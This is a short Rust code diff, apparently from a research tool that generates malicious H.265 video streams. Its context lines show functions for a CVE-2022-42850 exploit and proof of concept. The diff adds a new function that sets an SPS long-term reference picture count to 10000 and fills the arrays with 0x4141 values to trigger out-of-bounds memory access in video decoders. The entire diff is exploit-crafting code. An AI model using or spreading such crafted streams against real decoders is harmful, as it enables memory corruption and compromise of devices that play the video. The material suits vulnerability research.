@@ -217,6 +217,7 @@ pub fn cve_2022_42850_exploit(payload_pc_value: u64, ds: &mut H265DecodedStream)
         call_to_payload.1; // Top part
 }
 
+#[allow(dead_code)]
 pub fn cve_2022_42850_poc(ds: &mut H265DecodedStream) {
     // For this experiment, we want to modify the SPS number of short term reference pictures, as well
     // as the values inside that stream
@@ -245,4 +246,13 @@ pub fn cve_2022_42850_poc(ds: &mut H265DecodedStream) {
         ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].num_negative_pics = 0;
         ds.spses[sps_idx].st_ref_pic_set[st_rps_idx].num_positive_pics = 0;
     }
+}
+
+#[allow(dead_code)]
+pub fn oob_num_long_term_ref_pics_sps(ds: &mut H265DecodedStream) {
+    ds.spses[0].log2_max_pic_order_cnt_lsb_minus4 = 12;
+    ds.spses[0].long_term_ref_pics_present_flag  = true;
+    ds.spses[0].num_long_term_ref_pics_sps = 10000;
+    ds.spses[0].lt_ref_pic_poc_lsb_sps = vec![0x4141; 10000];
+    ds.spses[0].used_by_curr_pic_lt_sps_flag = vec![true; 10000];
 }
